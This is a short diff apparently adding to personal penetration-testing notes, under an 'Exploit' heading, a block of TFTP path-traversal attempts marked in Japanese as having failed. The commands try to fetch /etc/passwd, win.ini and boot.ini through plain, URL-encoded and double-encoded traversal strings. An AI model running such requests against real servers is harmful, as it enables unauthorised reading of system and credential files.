@@ -176,6 +176,23 @@ conference_factory_uri=sip:conference-factory@sip.linphone.org
 
 # Exploit
 
+- 以下は失敗
+```sh
+# Try path traversal
+tftp target.com <<EOF
+get ../../../etc/passwd
+get ..\..\..\..\windows\win.ini
+get ../../boot.ini
+quit
+EOF
+
+# URL encoded
+get %2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Double encoding
+get %252e%252e%252fetc%252fpasswd
+```
+
 
 ---
 
